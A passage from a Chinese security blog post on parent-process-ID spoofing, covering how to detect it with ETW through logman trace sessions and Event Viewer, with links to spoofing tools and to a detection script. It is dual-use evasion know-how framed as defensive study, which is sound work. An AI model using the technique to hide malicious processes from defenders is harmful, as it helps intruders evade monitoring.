<p>这块可以去看 <a target="_blank" rel="noopener" href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101</a> ，我这里会摘取文章的部分内容。</p>
</blockquote>
<ul>
<li><code>Providers（提供程序）</code>：可以产生事件日志的程序；</li>
<li><code>Consumers</code>：订阅和监听 Providers 发出的事件的程序（这个本文用不到）；</li>
<li><code>Keywords（关键字）</code>：Providers 提供给 Consumer 的事件类型；</li>
<li><code>Tracing session（跟踪会话）</code>：记录来自一个或多个 Providers 的事件；</li>
<li><code>Contollers</code>：可以启动 Tracing session 的程序。</li>
</ul>
<h3 id="2-选择-Providers"><a href="#2-选择-Providers" class="headerlink" title="2. 选择 Providers"></a>2. 选择 Providers</h3><p>了解完基本概念之后，然后根据官方文档 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/samples/etw-tracing">ETW（Event Tracing for Windows）</a> 的提示，我们可以用 Windows 自带的工具 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/logman-start-stop">Logman.exe</a> 启动 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-sessions">跟踪会话</a>。</p>
<blockquote>
<p>这里的 <code>Logman.exe</code>对应着上面的<code>Controllers</code>角色。</p>
</blockquote>
<p>首先列出有哪些 Providers</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logman query providers</span><br></pre></td></tr></table></figure>

<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-90c0f33178334dfe3614ba8f402d908c586b394b.png)</p>
<p>这里我们的 ppid 欺骗跟进程有关，所以这里只需要关注<code>Microsoft-Windows-Kernel-Process</code> 这个 providers 。可以查一下这个 Providers 更多的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 provider 名字查询</span></span><br><span class="line">logman query providers Microsoft-Windows-Kernel-Process</span><br><span class="line"><span class="comment"># 通过 GUID 查询</span></span><br><span class="line">logman query providers <span class="string">&quot;&#123;22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-3af72be14bbfc2e05f0c6330527a062d7ea8dd6b.png)</p>
<p>可以看到，这个 Providers 有一些 Keywords（关键字），代表这个 Providers 可以提供一些进程、线程等事件。对我们的 PPID欺骗来说，只要看进程就行，所以这里选择的关键字是<code>WINEVENT_KEYWORD_PROCESS</code>，对应值为<code>0x10</code></p>
<blockquote>
<p>题外话，如果我们想要 <code>WINEVENT_KEYWORD_PROCESS</code> 和 <code>WINEVENT_KEYWORD_THREAD</code> 怎么办？把它们两的值加起来就行，即（0x10+0x20&#x3D;<code>0x30</code>)</p>
</blockquote>
<h3 id="3-创建跟踪会话并指定-Provider"><a href="#3-创建跟踪会话并指定-Provider" class="headerlink" title="3. 创建跟踪会话并指定 Provider"></a>3. 创建跟踪会话并指定 Provider</h3><p>在选定了 Providers 之后，我们需要启动 Tracing session（跟踪会话）了，这里我们给会话起一个名字，叫<code>ppid-spoofing</code>，同时指定 Providers 是<code>Microsoft-Windows-Kernel-Process</code>，Keywords 是<code>0x10</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logman create trace ppid-spoofing -p Microsoft-Windows-Kernel-Process 0x10 -ets</span><br></pre></td></tr></table></figure>

<p>然后可以查一下这个跟踪会话的内容，确保它在运行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logman query ppid-spoofing -ets</span><br></pre></td></tr></table></figure>

<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-b6bf1bdcc7b31209419bafde2838515f00e6d214.png)</p>
<p>可以看到它正在运行了，同时结果会输出到<code>C:\ppid-spoofing.etl</code></p>
<h3 id="4-分析日志"><a href="#4-分析日志" class="headerlink" title="4. 分析日志"></a>4. 分析日志</h3><p>然后我们用记事本打开桌面上的<code>新建文本文档.txt</code>，关掉，然后再运行 ppid欺骗的代码，启动记事本。这一步是为了找出两者在日志中的不同。</p>
<blockquote>
<p>这玩意加载有点慢。。。最好我们可以再等会。。。等待期间可以随便的打开关闭一些程序。</p>
</blockquote>
<p>过一会查看<code>C:\ppid-spoofing.etl</code>，发现里面已经有了内容</p>
<blockquote>
<p>经过我实测，文件大小最好是大于8kb才有数据</p>
</blockquote>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-5514b5d44e77180c6c29523725ad0e193a8bd9fc.png)</p>
<p>然后打开<code>Event Viewer（事件查看器）</code>-&gt;打开保存的日志</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-39171f7c0882b0404ba8a91d819082a45356e21c.png)</p>
<p><strong>下图这里一定要选“否”</strong>，不然。。。自己测就知道了。。都是泪。。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-1e8ad5c3b784aa673fe03413d8e7af144073942c.png)</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-82c4c160604800de375e010f1272ff42b8442437.png)</p>
<p>然后开始找一下日志，首先找到了，我们直接在桌面打开的记事本的日志。可以看到，<code>Execution</code>下的<code>ProcessID</code>和<code>Data</code>下的<code>ParentProcessID</code>是一致的。</p>
<blockquote>
<p>如果没有日志，可以 事件查看器左边栏 -&gt; 保存的日志 -&gt; ppid-spoofing -&gt; 右键 -&gt; 删除，然后把事件查看器关了，按照上面的操作重新打开。不行就再等等。</p>
</blockquote>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-a03853da5b7cb21a50525e7af7f02553b97d672a.png)</p>
<p>然后找到了启动了我们的 ppid 欺骗程序的启动日志，注意，<code>ppid_spoofing.exe</code>的 <code>ProcessID</code> 是<code>4632</code></p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-96dfb9af57d6b100aa3ab5e99c840808527e72ed.png)</p>
<p>然后就是欺骗后的记事本了，可以看到，在<code>Data</code>下的<code>ParentProcessID</code>是我们在代码指定的 svchost.exe 的PID ，真正的 <code>ParentProcessID</code> 应该是<code>Execution</code>下的<code>ProcessID</code>，这里是<code>4632</code>，正好对应着上面的<code>ppid_spoofing.exe</code>的 <code>ProcessID</code> 。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-abd990d41985d2b2e539da235d965992746788b7.png)</p>
<p>因此得出结论，<code>Execution</code>下的<code>ProcessID</code>和<code>Data</code>下的<code>ParentProcessID</code>的值要一致，否则<strong>可能</strong>是 PPID 欺骗，而且真正的 PPID 应该以<code>Execution</code>下的<code>ProcessID</code>为准。</p>
<p>为啥说是<strong>可能</strong>呢？<a target="_blank" rel="noopener" href="https://blog.f-secure.com/detecting-parent-pid-spoofing/">https://blog.f-secure.com/detecting-parent-pid-spoofing/</a> 这文章中提到，UAC 会欺骗父进程。当 UAC 执行时，实际上是通过 svchost.exe 启动权限提升的进程，启动之后，会把该进程的父进程改成原始调用者。</p>
<p>举个例子，比如我们用管理员权限打开 cmd 的时候，在弹出UAC框之前，cmd 的父进程是 explorer.exe，弹出 UAC 框，问我们要不要用管理员权限的打开，如果我们点了ok之后，svchost.exe 就会启动管理员权限的 cmd.exe ，然后把 cmd.exe 的父进程改成原来的调用者 — explorer.exe。测试如下图：</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-39330aeca5aca322f41e9baae9a05dc756def5f2.png)</p>
<h3 id="5-终止跟踪会话"><a href="#5-终止跟踪会话" class="headerlink" title="5. 终止跟踪会话"></a>5. 终止跟踪会话</h3><p>分析完后，直接执行如下命令，把跟踪会话关掉即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logman stop ppid-spoofing -ets</span><br></pre></td></tr></table></figure>

<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-7a55cef51f0f1271a63eac36a08a0997c5449860.png)</p>
<h3 id="6-最终效果"><a href="#6-最终效果" class="headerlink" title="6. 最终效果"></a>6. 最终效果</h3><p>分析了这么多PPID欺骗该如何检测，现在看看效果。</p>
<p>去 <a target="_blank" rel="noopener" href="https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py">https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py</a> 拿到大佬写好的检测脚本，直接管理员打开 powershell，然后执行 python 脚本开始监听。然后执行 ppid 欺骗，过一会，就看到 python 脚本提示 notepad.exe 有问题了。</p>
<blockquote>
<p>先后顺序不能错，是先开启监听日志，然后再发起的攻击。</p>
</blockquote>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-1d9c115bd2c83260c0ffd853c35b9068d89473be.png)</p>
<p>检测代码也很简单，和刚刚分析的思路一致，即<code>Execution</code>下的<code>ProcessID</code>和<code>Data</code>下的<code>ParentProcessID</code>如果不一致，说明可能是PPID欺骗，再排除 UAC 即可。如果是 UAC 的话，会有个服务名字叫<code>appinfo</code>，代码中就是根据这个判断是不是 UAC的。</p>
<blockquote>
<p>实际上不仅仅只有 UAC 会发生PPID欺骗，别的程序也有，这个检测脚本仅仅排除了UAC而已。</p>
</blockquote>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-f84ae364c8459a66028901adc4537819fa3f6731.png)</p>
<h2 id="0x05-工具"><a href="#0x05-工具" class="headerlink" title="0x05 工具"></a>0x05 工具</h2><p>这里列出别人写好的程序。</p>
<h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>在 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8387">https://xz.aliyun.com/t/8387</a> 这里， Al1ex 师傅列了一大堆，我就不献丑了，自取。</p>
<h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h3><ul>
<li>Python：<a target="_blank" rel="noopener" href="https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py">https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py</a></li>
<li>C#：<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing">https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing</a></li>
</ul>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing">https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing</a></p>
<p><a target="_blank" rel="noopener" href="https://captmeelo.com/redteam/maldev/2021/11/22/picky-ppid-spoofing.html">https://captmeelo.com/redteam/maldev/2021/11/22/picky-ppid-spoofing.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.f-secure.com/detecting-parent-pid-spoofing/">https://blog.f-secure.com/detecting-parent-pid-spoofing/</a></p>
<h2 id="0x07-后言"><a href="#0x07-后言" class="headerlink" title="0x07 后言"></a>0x07 后言</h2><p>听过 PPID Spoofing 和 APC 注入更配哦，有机会试试！！</p>
<p>最后感谢大家的阅读，笔者学疏才浅，若有差错，恳请各位斧正。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/10/Parent%20Process%20ID%20(PPID)%20Spoofing%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/">http://example.com/2024/07/10/Parent%20Process%20ID%20(PPID)%20Spoofing%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/10/VEH%20syscall%20%E5%85%8D%E6%9D%80%E5%88%86%E6%9E%90/" title="VEH syscall 免杀分析"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VEH syscall 免杀分析</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/10/DLL%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/" title="DLL逆向学习"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DLL逆向学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">370</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">53</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Parent-Process-ID-PPID-Spoofing%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">Parent Process ID (PPID) Spoofing免杀学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%9B%AE%E7%9A%84%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 目的和原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%AE%8C%E5%96%84%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 完善代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%A3%80%E6%B5%8B"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ETW-%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. ETW 概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%89%E6%8B%A9-Providers"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 选择 Providers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%9B%E5%BB%BA%E8%B7%9F%E8%B8%AA%E4%BC%9A%E8%AF%9D%E5%B9%B6%E6%8C%87%E5%AE%9A-Provider"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. 创建跟踪会话并指定 Provider</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%86%E6%9E%90%E6%97%A5%E5%BF%97"><span class="toc-number">1.5.4.</span> <span class="toc-text">4. 分析日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%88%E6%AD%A2%E8%B7%9F%E8%B8%AA%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.5.5.</span> <span class="toc-text">5. 终止跟踪会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C"><span class="toc-number">1.5.6.</span> <span class="toc-text">6. 最终效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.1.</span> <span class="toc-text">利用工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.2.</span> <span class="toc-text">检测工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">0x06 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%90%8E%E8%A8%80"><span class="toc-number">1.8.</span> <span class="toc-text">0x07 后言</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/BP%20%E8%AF%AF%E5%B7%AE%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E6%B3%95%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86%20-%20online/" title="BP 误差反向传播法数学知识 - online"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BP 误差反向传播法数学知识 - online"/></a><div class="content"><a class="title" href="/2024/07/10/BP%20%E8%AF%AF%E5%B7%AE%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E6%B3%95%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86%20-%20online/" title="BP 误差反向传播法数学知识 - online">BP 误差反向传播法数学知识 - online</a><time datetime="2024-07-10T07:41:47.045Z" title="发表于 2024-07-10 15:41:47">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%EF%BC%8C%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/" title="线程，进程，协程的区别"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="线程，进程，协程的区别"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%EF%BC%8C%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/" title="线程，进程，协程的区别">线程，进程，协程的区别</a><time datetime="2024-07-10T04:04:54.315Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/" title="进程间的通信"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="进程间的通信"/></a><div class="content"><a class="title" href="/2024/07/10/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/" title="进程间的通信">进程间的通信</a><time datetime="2024-07-10T04:04:54.315Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/linux%E7%AE%A1%E9%81%93/" title="linux管道"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux管道"/></a><div class="content"><a class="title" href="/2024/07/10/linux%E7%AE%A1%E9%81%93/" title="linux管道">linux管道</a><time datetime="2024-07-10T04:04:54.314Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/" title="线程间的通信方式"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="线程间的通信方式"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/" title="线程间的通信方式">线程间的通信方式</a><time datetime="2024-07-10T04:04:54.314Z" title="发表于 2024-07-10 12:04:54">2024-07-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>